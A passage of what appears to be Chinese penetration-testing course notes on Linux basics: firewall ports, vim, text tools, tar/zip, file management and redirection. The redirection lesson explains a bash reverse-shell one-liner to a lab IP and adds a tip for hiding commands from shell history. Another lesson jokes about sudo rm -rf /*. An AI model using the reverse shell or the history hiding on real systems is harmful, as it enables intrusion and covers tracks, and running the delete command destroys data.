privileges;</code></pre><h1 id="查询3306端口是否开放firewall-cmd-query-port-3306-tcp-开放3306端口firewall-cmd-permanent-add-port-3306-tcpfirewall-cmd-permanent-add-port-3300-3310-tcp-移除端口firewall-cmd-permanent-remove-port-3306-tcp查看防火墙的开放的端口-firewall-cmd-permanent-list-ports重启防火墙firewall-cmd-reload"><a href="#查询3306端口是否开放firewall-cmd-query-port-3306-tcp-开放3306端口firewall-cmd-permanent-add-port-3306-tcpfirewall-cmd-permanent-add-port-3300-3310-tcp-移除端口firewall-cmd-permanent-remove-port-3306-tcp查看防火墙的开放的端口-firewall-cmd-permanent-list-ports重启防火墙firewall-cmd-reload" class="headerlink" title="查询3306端口是否开放firewall-cmd --query-port=3306/tcp# 开放3306端口firewall-cmd --permanent --add-port=3306/tcpfirewall-cmd --permanent --add-port=3300-3310/tcp# 移除端口firewall-cmd --permanent --remove-port=3306/tcp查看防火墙的开放的端口 :firewall-cmd --permanent&nbsp;--list-ports重启防火墙firewall-cmd --reload"></a>查询3306端口是否开放<br><code>firewall-cmd --query-port=3306/tcp</code><br># 开放3306端口<br><code>firewall-cmd --permanent --add-port=3306/tcp</code><br><code>firewall-cmd --permanent --add-port=3300-3310/tcp</code><br># 移除端口<br><code>firewall-cmd --permanent --remove-port=3306/tcp</code><br>查看防火墙的开放的端口 :<br><code>firewall-cmd --permanent&nbsp;--list-ports</code><br>重启防火墙<br><code>firewall-cmd --reload</code></h1><p><a name="b2OC0"></a></p><h3 id="Linux命令搜索引擎命令搭建"><a href="#Linux命令搜索引擎命令搭建" class="headerlink" title="Linux命令搜索引擎命令搭建"></a>Linux命令搜索引擎命令搭建</h3><p><a href="https://github.com/jaywcjlove/linux-command">https://github.com/jaywcjlove/linux-command</a> <a name="PrCAz"></a></p><h4 id="先安装Docker"><a href="#先安装Docker" class="headerlink" title="先安装Docker"></a>先安装Docker</h4><pre><code>apt install docker.ioapt install podman-docker</code></pre><p><a name="JuI7z"></a></p><h4 id="通过Docker安装"><a href="#通过Docker安装" class="headerlink" title="通过Docker安装"></a>通过Docker安装</h4><p>轻松通过 docker 部署 linux-command 网站。</p><pre><code>docker pull wcjiang/linux-command # Or docker pull ghcr.io/jaywcjlove/linux-command:latest</code></pre><!----><pre><code>docker run --name linux-command --rm -d -p 9665:3000 wcjiang/linux-command:latest # Or docker run --name linux-command -itd -p 9665:3000 wcjiang/linux-command:latest # Or docker run --name linux-command -itd -p 9665:3000 ghcr.io/jaywcjlove/linux-command:latest</code></pre><p><a name="qQQET"></a></p><h4 id="在浏览器中访问以下-URL"><a href="#在浏览器中访问以下-URL" class="headerlink" title="在浏览器中访问以下 URL"></a>在浏览器中访问以下 URL</h4><p><strong><a href="http://localhost:9665/">http://localhost:9665/</a></strong><br><code>http://192.168.31.76:9665</code></p><p><a name="xKMMh"></a></p><h1 id="软件版本管理"><a href="#软件版本管理" class="headerlink" title="软件版本管理"></a>软件版本管理</h1><p><a name="IHHxG"></a></p><h2 id="update-alternatives"><a href="#update-alternatives" class="headerlink" title="update-alternatives"></a>update-alternatives</h2><ul><li>查看:</li></ul><!----><pre><code>update- alternatives --display java</code></pre><ul><li>添加:</li></ul><!----><pre><code>alternatives --install /usr/bin/java java /usr/local/jdk-11.0.2/bin/java 3</code></pre><p><code>/usr/bin/java</code>: 注册地址，软链<br><code>java</code>:服务名<br><code>/usr/local/jdk-11.0.2/bin/java</code>:实际程序路径<br><code>3</code>:优先级</p><ul><li>切换:</li></ul><!----><pre><code>update-alternatives --config java </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-8-Linux文本编辑器</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-8-wen-ben-bian-ji-qi/ke-shi-1-8-linux-wen-ben-bian-ji-qi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-8-wen-ben-bian-ji-qi/ke-shi-1-8-linux-wen-ben-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<p><a name="zxQ38"></a></p><h2 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h2><p>Windows: Notepad (记事本)、Sublime、 UltraEdit等<br>Linux: VI/VIM、 nano、Emacs、Sed、 gedit、 Kate等</p><p><a name="mxYbZ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>VI和VIM的区别</li><li>VIM配置文件</li><li>VIM三种模式的关系</li><li>命令模式</li><li>编辑模式</li><li>底行模式 <a name="iXRZA"></a></li></ol><h1 id="VI和VIM的区别"><a href="#VI和VIM的区别" class="headerlink" title="VI和VIM的区别"></a>VI和VIM的区别</h1><ul><li>VI: Visual Interface</li><li>1976 Bill Joy(ex)</li><li>1991 Bram Moolenaar</li><li>Vim: VI IMproved</li></ul><p>vim语法高亮 <a name="jQX1Q"></a></p><h1 id="VIM配置文件"><a href="#VIM配置文件" class="headerlink" title="VIM配置文件"></a>VIM配置文件</h1><p>全局配置: <code>/etc/vimrc</code><br>用户配置: ~/.vimrc<br>详细配置参考:<br><a href="https://blog.csdn.net/xiao_yi_xiao/article/details/118491698">https://blog.csdn.net/xiao_yi_xiao/article/details/118491698</a> <a name="XKNi5"></a></p><h1 id="VIM三种模式切换"><a href="#VIM三种模式切换" class="headerlink" title="VIM三种模式切换"></a>VIM三种模式切换</h1><p><img src="../../../../assets/fdngr26334cckpx7_xol247/1668312690746-f16ae486-e981-4adb-8222-e1fb420613bb.png" alt="image.png"> <a name="kiyGK"></a></p><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p><a name="ik7BW"></a></p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>VIM 文件名<br>vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>vim redis.conf</p><p>错误提示:<br>E325: ATTENTION<br>Found a swap file by the name “.redis.conf.swp”<br>原因:编辑未结束<br>解决办法:保存文本文件，或者删除.swp <a name="h9qjT"></a></p><h3 id="移动光标操作"><a href="#移动光标操作" class="headerlink" title="移动光标操作"></a>移动光标操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>移动光标</td><td>方向键↑ ↓ ← →</td></tr><tr><td>跳到行首</td><td>HOME</td></tr><tr><td>跳到行尾</td><td>END</td></tr><tr><td>向后前进多少行</td><td>n数字</td></tr><tr><td>退出前进一屏(Forward)</td><td>Ctrl+F</td></tr><tr><td>后退一屏(Backspace)</td><td>Ctrl+B</td></tr><tr><td>跳到文档末尾</td><td>Shift+G  /  G</td></tr><tr><td>跳到文档开头</td><td>:1 / gg</td></tr></tbody></table><p>显示文件行号：set number</p><p><a name="xoeKW"></a></p><h3 id="搜索替换操作"><a href="#搜索替换操作" class="headerlink" title="搜索替换操作"></a>搜索替换操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>向后查找内容</td><td>/关键字，回车</td></tr><tr><td>向前查找内容</td><td>?关键字，回车</td></tr><tr><td>n</td><td>下一个关键字</td></tr><tr><td>N</td><td>上一个关键字</td></tr></tbody></table><p><a name="QEfuB"></a></p><h3 id="删除和复制操作"><a href="#删除和复制操作" class="headerlink" title="删除和复制操作"></a>删除和复制操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>复制光标所在行</td><td>yy</td></tr><tr><td>粘贴到下一行/上一行</td><td>p / P</td></tr><tr><td>删除光标前面一个字符</td><td>X</td></tr><tr><td>删除光标后面1个字符</td><td>Del/x</td></tr><tr><td>删除一行</td><td>dd</td></tr><tr><td>删除光标下面n行</td><td>ndd</td></tr><tr><td>重复上一次的操作</td><td>.</td></tr><tr><td>撤消最近一次操作</td><td>u</td></tr><tr><td>恢复最近一次操作</td><td>Ctrl+ R</td></tr></tbody></table><p><a name="gY4bR"></a></p><h2 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h2><p><a name="AejkP"></a></p><h3 id="进入编辑模式"><a href="#进入编辑模式" class="headerlink" title="进入编辑模式"></a>进入编辑模式</h3><p>a:在光标下一个字符之前插入文本<br>A:在光标所在的航模插入文本<br>i: 在光标上一个字符之前插入文本<br>l:在光标的行首插入文本<br>o:在光标所在的行下插入- -行文本<br>O:在光标所在的行上插入- -行文本<br>r:修改当前光标所在的字符<br>R:替换文本</p><p><a name="aUHiP"></a></p><h3 id="撤消"><a href="#撤消" class="headerlink" title="撤消"></a>撤消</h3><p>编辑模式下: Ctrl+U 撤消<br>退出编辑模式: Esc</p><p><a name="I2lvO"></a></p><h2 id="进入底行模式"><a href="#进入底行模式" class="headerlink" title="进入底行模式"></a>进入底行模式</h2><p>Shift + :<br><code>:w</code>保存<br><code>:q</code>退出<br><code>:wq</code>保存并且保存<br><code>:q!</code>放弃修改，退出<br>:e!放弃所有更改，重新编辑(不关闭</p><p>显示行号:   <code> :set nu</code><br>:%s/word1/word2/g 把文档中的word1替换为word2</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-7-查看和处理文件内容</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-7-cha-kan-he-chu-li-wen-jian-nei-rong/ke-shi-1-7-cha-kan-he-chu-li-wen-jian-nei-rong/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-7-cha-kan-he-chu-li-wen-jian-nei-rong/ke-shi-1-7-cha-kan-he-chu-li-wen-jian-nei-rong/</url>
      
        <content type="html"><![CDATA[<p><a name="et6yQ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>cat：查看</li><li>more/less</li><li>head/tail</li><li>grep、 管道符号</li><li>wc:统计</li><li>diff：对比 <a name="Pov4G"></a></li></ol><h2 id="文本文件"><a href="#文本文件" class="headerlink" title="文本文件"></a>文本文件</h2><ul><li>ASCII、UTF-8、 Unicode、 ANSI</li><li>txt、xml、 conf、properties、 yml等配置文件、日志文件、源代码 <a name="Yj3JF"></a></li></ul><h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><ul><li>可执行程序、图片、音频、视频 <a name="maBWB"></a></li></ul><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>全拼: concatenate [kon’ kaetanert] 连接<br>格式: cat 文件名 <a name="b6Jij"></a></p><h1 id="more-x2F-less"><a href="#more-x2F-less" class="headerlink" title="more/less"></a>more/less</h1><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>分页查看</td><td>more redis.conf</td></tr><tr><td>第三行开始显示</td><td>more +3 test.log</td></tr><tr><td>从出现wuya开始显示</td><td>more +/wuya test.log</td></tr></tbody></table><p><a name="Ou6Fk"></a></p><h2 id="more-x2F-less分屏操作"><a href="#more-x2F-less分屏操作" class="headerlink" title="more/less分屏操作"></a>more/less分屏操作</h2><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>下一行</td><td>Enter、箭头下</td></tr><tr><td>上一行</td><td>y、箭头上</td></tr><tr><td>下一屏</td><td>Space空格/CtrI+F</td></tr><tr><td>上一屏</td><td>b</td></tr><tr><td>退出</td><td>q / ctrl + c /ZZ</td></tr></tbody></table><p><a name="WQIJV"></a></p><h2 id="more-x2F-less搜索"><a href="#more-x2F-less搜索" class="headerlink" title="more/less搜索"></a>more/less搜索</h2><p>/[查找字符] # 配合n键，从上往下查所有。<br>?[查找字符] # 配合n键，从下往上查所有。<br>按Enter键后:<br>n键盘查找下一个符合的内容。<br>N上一个符合的内容。 <a name="eWVGm"></a></p><h1 id="head-x2F-tail-实时显示"><a href="#head-x2F-tail-实时显示" class="headerlink" title="head/tail 实时显示"></a>head/tail 实时显示</h1><p>前10行：head -n 10 redis.conf<br>末尾10行：tail-n 10 info.log<br>显示末尾实时最新的内容：tail -f /var/log/messages</p><p><a name="IN0VU"></a></p><h1 id="grep-全局搜索"><a href="#grep-全局搜索" class="headerlink" title="grep 全局搜索"></a>grep 全局搜索</h1><p>全拼: Globally search a Regular Expression and Print<br>全局搜索正则表达式并打印</p><p>格式:grep 选项 模式 文件名 <a name="mnfWm"></a></p><h1 id="管道符号pipe"><a href="#管道符号pipe" class="headerlink" title="管道符号pipe"></a>管道符号pipe</h1><p>把前一个命令原本要输出到屏幕的数据当作是后一个命令的标准输入</p><p>command1 | command2 | command3<br>cat test.log | more -5每次显示5行<br>ps -ef | less -N显示行号</p><p>netstat -an | grep 3306<br>cat -n info.log | grep “debug” | more <a name="d0JYM"></a></p><h1 id="wc-统计"><a href="#wc-统计" class="headerlink" title="wc 统计"></a>wc 统计</h1><p>全拼: word count<br>-l或–lines 显示行数<br>-w或–words只显示字数<br>wc -l redis.conf<br>wc -w redis.conf <a name="qtXTD"></a></p><h1 id="diff-对比"><a href="#diff-对比" class="headerlink" title="diff 对比"></a>diff 对比</h1><p>全拼: different<br>文件内容差异：diff diff_A.txt diff_B.txt<br>目录差异：diff -r aaa bbb</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-6-文件压缩及解压缩</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-6-wen-jian-ya-suo-ji-jie-ya-suo/ke-shi-1-6-wen-jian-ya-suo-ji-jie-ya-suo/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-6-wen-jian-ya-suo-ji-jie-ya-suo/ke-shi-1-6-wen-jian-ya-suo-ji-jie-ya-suo/</url>
      
        <content type="html"><![CDATA[<p>课程大纲</p><ol><li>打包和压缩的区别</li><li>常见压缩格式</li><li>tar命令</li><li>zip命令 <a name="fzA4B"></a></li></ol><h1 id="打包和压缩的区别"><a href="#打包和压缩的区别" class="headerlink" title="打包和压缩的区别"></a>打包和压缩的区别</h1><p>打包:多个文件变成一个文件——减少文件个数<br>压缩:缩小一个文件的体积——减少文件体积 <a name="H6loX"></a></p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>打包/解包 pack/unpack <a name="N0eDL"></a></p><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>压缩/解压compress/decompress<br>图片: BMP、GIF、 PNG、JPEG、 JPG<br>音频: APE、FLAC、 MP3<br>视频: RMVB、AVI、 MP4</p><p>压缩率:压缩后体积/压缩前体积</p><p><a name="ZZ854"></a></p><h2 id="其他作用"><a href="#其他作用" class="headerlink" title="其他作用"></a>其他作用</h2><p>添加密码<br>注意:打包、解包、压缩、解压都需要消耗时间 <a name="UI3zs"></a></p><h1 id="常见压缩格式"><a href="#常见压缩格式" class="headerlink" title="常见压缩格式"></a>常见压缩格式</h1><ul><li>HTTP: gzip</li></ul><p>gzip、deflate(zlib的格式)、 br(Brotli)、 identity(不压缩)</p><ul><li>Windows: zip、rar、7zip</li></ul><p>winrar、360压缩、bandzip、 7zip</p><ul><li>Linux: gzip (tar.gz=.tgz) 、bzip2 (.bz2)、zip</li></ul><p>tgz打包后压缩，默认压缩算法bzip2<br>tar:Tape Archive(磁带归档)</p><p>压缩后体积: tar.bz2 &lt; tgz &lt; tar<br>压缩解压时间: tar.bz2 &gt; tar &gt; tgz <a name="GPJxt"></a></p><h2 id="tar常用选项"><a href="#tar常用选项" class="headerlink" title="tar常用选项"></a>tar常用选项</h2><table><thead><tr><th>选项</th><th>作用</th><th>单词</th></tr></thead><tbody><tr><td>-c</td><td>创建打包文件</td><td>create</td></tr><tr><td>-v</td><td>显示打包或解包的详细信息</td><td>verbose</td></tr><tr><td>-f</td><td>指定文件名称，必须放到所有选项后面</td><td>file</td></tr><tr><td>-z</td><td>压缩或解压缩(.gz)</td><td></td></tr><tr><td>-j</td><td>压缩或解压缩(.bz2)</td><td></td></tr><tr><td>-x</td><td>解包</td><td></td></tr><tr><td>-C</td><td>解压缩到指定目录</td><td></td></tr></tbody></table><p><a name="xYS7n"></a></p><h2 id="tar用法示例"><a href="#tar用法示例" class="headerlink" title="tar用法示例"></a>tar用法示例</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>打包(不压缩)</td><td>tar -cvf test.tar test/</td></tr><tr><td>解包</td><td>tar -xvf test.tar</td></tr><tr><td>打包并gz压缩</td><td>tar -zcvf test.tar.gz test/</td></tr><tr><td>解压</td><td>tar-zxvf test.tar.gz</td></tr><tr><td>解压到指定目录</td><td>tar -zxvf test.tar.gz -C aaa</td></tr><tr><td>打包并bz2压缩</td><td>tar -jcvf test.tar.bz2 test/</td></tr><tr><td>解压</td><td>tar -jxvf test.tar.bz2 test/</td></tr><tr><td>解压到指定目录</td><td>tar -jxvf test.tar.bz2 test/ -C aaa</td></tr></tbody></table><p><a name="egqUU"></a></p><h2 id="tar其他操作"><a href="#tar其他操作" class="headerlink" title="tar其他操作"></a>tar其他操作</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>仅查看不解压</td><td>tar -tf test.tar</td></tr><tr><td>追加文件</td><td>tar -rf test.tar *.gif</td></tr><tr><td>替换文件</td><td>tar -uf test.tar huaji.gif</td></tr><tr><td>加密</td><td>tar -zcf - *.txt</td></tr><tr><td>解密</td><td>ddjf=test.des3 lopenssl des3 -d -k 123456</td></tr></tbody></table><p><a name="GBHZh"></a></p><h2 id="zip用法示例"><a href="#zip用法示例" class="headerlink" title="zip用法示例"></a>zip用法示例</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>压缩</td><td>zip test.zip *.txt</td></tr><tr><td>解压缩</td><td>unzip test.zip</td></tr><tr><td>解压缩到指定目录</td><td>unzip test.zip -d bbb</td></tr><tr><td>添加密码</td><td>zip -rP 123456 test.zip *.txt</td></tr><tr><td>使用密码解压</td><td>unzip -P 123456 test.zip</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-5-Linux文件和目录管理</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-5-wen-jian-yu-mu-lu-guan-li/ke-shi-1-5-linux-wen-jian-he-mu-lu-guan-li/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-5-wen-jian-yu-mu-lu-guan-li/ke-shi-1-5-linux-wen-jian-he-mu-lu-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="bVqdZ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>列出目录</li><li>打印工作路径</li><li>切换工作路径</li><li>查看文件类型</li><li>复制文件或目录</li><li>查找文件或者目录</li><li>创建目录</li><li>移动或者重命名</li><li>删除文件或目录</li><li>创建空文件</li><li>软链接和硬链接</li><li>挂载</li></ol><p><a name="zDUTW"></a></p><h1 id="常规命令格式"><a href="#常规命令格式" class="headerlink" title="常规命令格式"></a>常规命令格式</h1><p>Command   Options   Arguments<br>命令               选项           参数</p><blockquote><p>rm -rf /*<br>-r递归<br>-f强制</p></blockquote><p>Options选项:命令的行为方式<br>Arguments参数:命令的对象 <a name="ndgS6"></a></p><h2 id="Linux怎么删库跑路"><a href="#Linux怎么删库跑路" class="headerlink" title="Linux怎么删库跑路?"></a>Linux怎么删库跑路?</h2><p>打开系统Terminal(终端)输入:</p><table><thead><tr><th>sudo</th><th>rm</th><th>-rf</th><th>/*</th></tr></thead><tbody><tr><td>以系统管理员的身份执行</td><td>ReMove   移除</td><td>递归，强制</td><td>目最下所有文件</td></tr></tbody></table><p>以系统管理者的身份移除Rubbish Flies目录下的所有文件\ <a name="ggfpV"></a></p><h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><ul><li>命令</li><li>空格</li><li>大小写</li><li>顺序 <a name="I1oJq"></a></li></ul><h2 id="命令选项详细参考资料"><a href="#命令选项详细参考资料" class="headerlink" title="命令选项详细参考资料"></a>命令选项详细参考资料</h2><p><a href="https://wangchujiang.com/linux-command">https://wangchujiang.com/linux-command</a><br><a href="https://www.linuxcool.com.com/">https://www.linuxcool.com</a></p><p><a name="FX22Q"></a></p><h1 id="文件和目录管理"><a href="#文件和目录管理" class="headerlink" title="文件和目录管理"></a>文件和目录管理</h1><p><a name="er8g0"></a></p><h2 id="列出目录内容和属性"><a href="#列出目录内容和属性" class="headerlink" title="列出目录内容和属性"></a>列出目录内容和属性</h2><p>命令: Is<br>全拼: list<br>格式: Is 选项 文件名<br>例:<br>ls -a<br>lI –block-size=M</p><p><a name="jam3z"></a></p><h2 id="打印工作路径"><a href="#打印工作路径" class="headerlink" title="打印工作路径"></a>打印工作路径</h2><p>命令. pwd<br>全拼: print working directory<br>格式: pwd</p><p><a name="x8JMT"></a></p><h2 id="切换工作目录"><a href="#切换工作目录" class="headerlink" title="切换工作目录"></a>切换工作目录</h2><p>命令: cd<br>全拼: change directory<br>格式: cd相对路径或者绝对路径</p><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>绝对路径</td><td>由根目录 / 开始写起</td></tr><tr><td>相对路径</td><td>从当前所在的工作目录开始写起</td></tr><tr><td><code>/</code></td><td>根目录</td></tr><tr><td><code>.</code></td><td>代表当前目录</td></tr><tr><td><code>~</code></td><td>代表用户工作目录，vim ~/.bashrc</td></tr><tr><td><code>../</code></td><td>代表上一-级目录</td></tr><tr><td><code>../../</code></td><td>上上一级目录，以此类推，超出范围的时候代表根目录</td></tr></tbody></table><p><a name="Mw8R1"></a></p><h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><p>命令: file<br>格式: file 选项 文件或目录<br>file -i 文件名 <a name="yfnq6"></a></p><h2 id="复制文件或目录"><a href="#复制文件或目录" class="headerlink" title="复制文件或目录"></a>复制文件或目录</h2><p>命令: cp<br>全拼: copy<br>格式: cp 选项源文件 目标文件</p><p>-R/r:递归处理，将指定目录下的所有文件与子目录一并处理;<br>-f: 强行复制文件或目录，不论目标文件或目录是否已存在;</p><p><a name="UunOw"></a></p><h2 id="查找文件或者目录"><a href="#查找文件或者目录" class="headerlink" title="查找文件或者目录"></a>查找文件或者目录</h2><p>find<br>格式: find 目录 选项 名字或模式</p><p>-name 名字<br>find /etc -name a*<br>find / -name “aaa” 2&gt; /dev/null</p><p>-type类型参数<br>f 普通文件, d目录<br>find /root -type f</p><p>-size大小<br>find /root -type f -size 10M</p><p>-exec command<br>把find找到的内容作为命令的参数去执行<br>{}就是找到的内容<br>find . -name “*.txt” -exec rm -rf{} ; (包括子目录)<br>find . -name aaa -exec mv {} bbb ;</p><p><a name="tGqdL"></a></p><h3 id="其他查找命令"><a href="#其他查找命令" class="headerlink" title="其他查找命令"></a>其他查找命令</h3><p>whereis :查找二进制程序、代码等相关文件路径<br>which:查找并显示给定命令的绝对路径<br>locate: updatedb程序每天会跑一次，建立文件索引 <a name="OUltD"></a></p><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p>命令:mkdir<br>全拼: make direcotry<br>格式: mkdir选项目录名<br>mkdir test<br>mkdir -p /usr/local/soft/redis</p><p>-p 创建多级目录</p><p><a name="Ys95f"></a></p><h2 id="移动或者重命名"><a href="#移动或者重命名" class="headerlink" title="移动或者重命名"></a>移动或者重命名</h2><p>命令: mv<br>全拼: move<br>格式: mv选项 原文件 新文件<br>mv 1.txt 2.txt<br>mv /a/1.txt /b/1.txt <a name="kS2an"></a></p><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>命令: rm<br>全拼: remove<br>格式: rm 选项(多个)文件名<br>删除空目录: rmdir<br>-r 递归(连同子文件夹一起删除)<br>-f 强制删除<br>find . -name “a.json” -exec rm -rf {}</p><p><a name="QTFeJ"></a></p><h2 id="创建空文件"><a href="#创建空文件" class="headerlink" title="创建空文件"></a>创建空文件</h2><p>命令: touch<br>格式: touch 选项 文件名<br>touch a.txt <a name="kbti7"></a></p><h2 id="挂载mount"><a href="#挂载mount" class="headerlink" title="挂载mount"></a>挂载mount</h2><p>问题: -个目录树怎么使用多个磁盘?<br>原路径: /dev/sdb1 挂载到: /sdb-u<br>mkdir /sdb-u<br>mount /dev/sdb1 /sdb-u</p><p><a name="UKbhI"></a></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>命令: In<br>全拼: link<br>格式: In 源文件 链接文件 <a name="bAeQW"></a></p><h3 id="创建硬链接"><a href="#创建硬链接" class="headerlink" title="创建硬链接:"></a>创建硬链接:</h3><p>In 1.php hard.php<br>vim hard.php<br>cat 1.php<br>注意:<br>1、用户不能给目录创建硬链接<br>2、只有相同的文件系统才可以创建硬链接(tmpfs NTFS FAT32) <a name="WS95b"></a></p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>查看软链接:<br>II /usr/bin/nc<br>创建软链接:&amp;#x20;<br>In -s /usr/local/phpstudy/system/phpstudyctl /usr/bin/study<br>使用:<br>study</p><p>源文件删除，软连接失效</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-4.3-文件描述符和重定向</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-3-4.3-wen-jian-miao-shu-fu-he-chong-ding-xiang/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-3-4.3-wen-jian-miao-shu-fu-he-chong-ding-xiang/</url>
      
        <content type="html"><![CDATA[<p><a name="zETHm"></a></p><h1 id="文件描述符-File-Descriptor"><a href="#文件描述符-File-Descriptor" class="headerlink" title="文件描述符 File Descriptor"></a>文件描述符 File Descriptor</h1><table><thead><tr><th>ID</th><th>描述</th><th>设备</th></tr></thead><tbody><tr><td>0</td><td>标准输入(stdin)</td><td>键盘</td></tr><tr><td>1</td><td>标准输出(stdout)</td><td>显示器</td></tr><tr><td>2</td><td>标准错误输出(stderr)</td><td>显示器</td></tr></tbody></table><p><a name="yGRgE"></a></p><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><table><thead><tr><th>符号</th><th>类别</th></tr></thead><tbody><tr><td>&gt;和&gt;&gt;</td><td>输出重定向</td></tr><tr><td>&amp;&gt;</td><td>表示将一个流(stream)重定向到另一个文件描述符(file descriptor)</td></tr><tr><td>&lt;和&lt;&lt;</td><td>输入重定向</td></tr></tbody></table><p>重定向:改变输入输出的方向</p><p><a name="t8iIu"></a></p><h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><table><thead><tr><th>类别</th><th>命令格式</th><th>示例</th></tr></thead><tbody><tr><td>标准输出</td><td></td><td></td></tr><tr><td>重定向</td><td>command &gt;file</td><td>Is / 1&gt; test.txt (1可以省略)</td></tr><tr><td></td><td>command &gt;&gt;file</td><td>Is / 1&gt;&gt;test.txt (1可以省略)</td></tr><tr><td>标准错误输出</td><td></td><td></td></tr><tr><td>重定向</td><td>command 2&gt;file</td><td>find / -name “aaa” 2&gt;err.txt</td></tr><tr><td></td><td>command 2&gt;&gt; file</td><td>find / -name “aaa” 2&gt;/dev/null</td></tr><tr><td>输出和错误重定向</td><td>command &gt;file 2&gt;&amp;1</td><td>find / -name “aaa” &gt;test.txt 2&gt;&amp;1</td></tr></tbody></table><p>注释：&gt;会覆盖内容，&gt;&gt;是追加内容 <a name="HNewB"></a></p><h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><table><thead><tr><th>命令格式</th><th>示例</th></tr></thead><tbody><tr><td>command &lt; file</td><td>将file文件中的内容作为command的输入(省略了0)</td></tr><tr><td>command &lt; END</td><td>从标准输入(键盘)中读取数据，直到遇见分界符END才停止</td></tr><tr><td>command &lt; file1 &gt; file2</td><td>将file1作为command的输入，并将command的处理结果输出到file2</td></tr><tr><td>wc -l &lt; test.txt</td><td>统计test.txt文件中有多少行文本</td></tr><tr><td>wc -l &lt;&lt; END</td><td>统计用户在终端输入的文本的行数</td></tr></tbody></table><p><a name="iwGNl"></a></p><h4 id="bash反弹连接案例"><a href="#bash反弹连接案例" class="headerlink" title="bash反弹连接案例"></a>bash反弹连接案例</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.142.44/7777 0&gt;&amp;1</code></p><p>bash -i 在靶机打开交互式的Shell<br>/dev/tcp/192.168.142.44/7777 连接到攻击机IP端口<br>&gt;&amp;和&amp;&gt;等价，代表标准输出1 +错误输出2;把靶机的输出重定向到攻击机——接收结果用。<br>0&gt;&amp;1，左边是标准输入。右边是标准输出，输出重定向。把靶机的输入重定向为攻击机的输出——接收命令用。<br>所以，靶机的输入输出都到了攻击机上。</p><pre><code>echo HISTCONTROL=ignorespace &gt;&gt; ~/.bashrcsource ~/.bashrcvim ~/.bashrchistory  cd .history空两格输入命令后，不会记录在history中</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-4.2-Linux常用操作</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-2-4.2-linux-chang-yong-cao-zuo/"/>
